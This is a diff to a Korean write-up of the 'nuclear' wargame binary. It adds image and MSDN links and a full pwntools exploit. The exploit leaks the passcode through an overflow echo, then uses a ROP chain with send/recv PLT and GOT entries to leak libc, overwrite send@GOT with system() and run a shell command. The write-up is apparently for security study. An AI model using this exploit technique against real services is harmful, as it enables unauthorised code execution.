@@ -13,7 +13,7 @@ nuclear를 관리하는 시스템 이라는 것을 알 수 있습니다 ㅋㅋ
 
 명령어는 아래 그림과 같이 target, quit, launch세가지 명령어를 지원하는 것을 볼 수 있습니다.
 
-![Alt text]()
+![Alt text](https://github.com/Funniest/System-study/blob/master/nuclear/img/Main.PNG)
 
 한 명령어씩 살펴보자면, quit는 프로그램을 종료하는 명령어입니다!
 
@@ -27,7 +27,7 @@ nuclear를launch명령어를 실행 시키면, 아래 그림과  같이 나오�
 
 이 캔슬 코드를 입력 받는 곳에서 버퍼는 -20C인데, 0x512만큼 입력을 받아 오버플로우가 생기게 됩니다.
 
-![Alt text]()
+![Alt text](https://github.com/Funniest/System-study/blob/master/nuclear/img/Start_routine.PNG)
 
 그럼 시나리오는 PASSCODE를 찾아서 launch에 진입한 뒤 CANCEL CODE를 오버플로우나게 입력하면 됩니다!
 
@@ -43,11 +43,11 @@ leak을 어떻게 해야할까요?
 
 첫 번째로는 알수없는 커멘드를 입력하면 Unkonw command를 출력하며, 자기가 입력한 커멘드를 보여줍니다.
 
-![Alt text]()
+![Alt text](https://github.com/Funniest/System-study/blob/master/nuclear/img/Unkonw.PNG)
 
 이 커맨드를 입력받는 곳은 s1이고 -283에 위치해 있습니다. 그 아래로 var_38, 34가 보입니다.
 
-![Alt text]()
+![Alt text](https://github.com/Funniest/System-study/blob/master/nuclear/img/Value.PNG)
 
 s1을 꽉 채운후 var_38,34가 꽉 차있다면 s가 Unkonw command메시지가 나올 때 깥이 나오겠져?
 
@@ -57,11 +57,11 @@ target명령어 안의 sscanf를 이용하여 var_38, 34를 채울 수 있습니
 
 저는 처음 sscanf가 뭔지 몰라 릭하는데 조금 해멧었내요!
 
-![Alt text]()
+![Alt text](https://github.com/Funniest/System-study/blob/master/nuclear/img/msdn.PNG)
 
 처음 입력받는 곳이 sscanf밖에 없어서 한번 검색을 해보았습니다.
 
-msdn 링크
+[sscanf msdn]https://msdn.microsoft.com/ko-kr/ms860379
 
 대충 sscanf동작을 보면, 주어진 buffer에서 정해준 형식대로 입력될 버퍼들에게 전달하는 역할을 하는 함수입니다.
 
@@ -97,5 +97,81 @@ scanf하고 거희 유사해요!
 Ubuntu 16 LTS 64bit환경에서 테스팅 해보았습니다.
 
 ```
+from pwn import *
+import time
 
+r =remote('127.0.0.1', 1129)
+
+elf = ELF('./nuclear_d4f699f3dbb8aadf7c224aa57f57eb4c')
+
+#leak passcode
+print r.recvuntil('> ')
+r.sendline('target')
+print r.recvuntil('---> ')
+r.sendline('123123.123123/123123.123123')
+print r.recvuntil('> ')
+r.sendline('A'*0x200)
+print r.recvuntil(': ')
+print r.recv(0x208)
+
+passcode = r.recv(21)
+print "Pass code : " + passcode
+
+print r.recvuntil(": ")
+print r.recvuntil("> ")
+
+#exploit
+r.sendline("launch")
+print r.recvuntil(": ")
+r.sendline(passcode)
+
+bss = elf.bss()
+send_plt = elf.plt['send']
+send_got = elf.got['send']
+recv_plt = elf.plt['recv']
+send_system_libc = 0x18A760
+
+ppppr = 0x804917c
+cmd = "ls -al"
+
+payload = ''
+payload += "A" * 0x210
+payload += p32(send_plt)
+payload += p32(ppppr)
+payload += p32(0x04)
+payload += p32(send_got)
+payload += p32(0x04)
+payload += p32(0x00)
+
+payload += p32(recv_plt)
+payload += p32(ppppr)
+payload += p32(0x04)
+payload += p32(bss)
+payload += p32(len(cmd))
+payload += p32(0x00)
+
+payload += p32(recv_plt)
+payload += p32(ppppr)
+payload += p32(0x04)
+payload += p32(send_got)
+payload += p32(0x04)
+payload += p32(0x00)
+
+payload += p32(send_plt)
+payload += "AAAA"
+payload += p32(bss)
+
+r.sendline(payload)
+
+print r.recv(1024)
+
+send_libc = u32(r.recv(4))
+system_addr = send_libc - send_system_libc
+print hex(system_addr)
+
+r.send(cmd)
+
+r.send(p32(system_addr))
+
+print r.recv(1024)
 ```
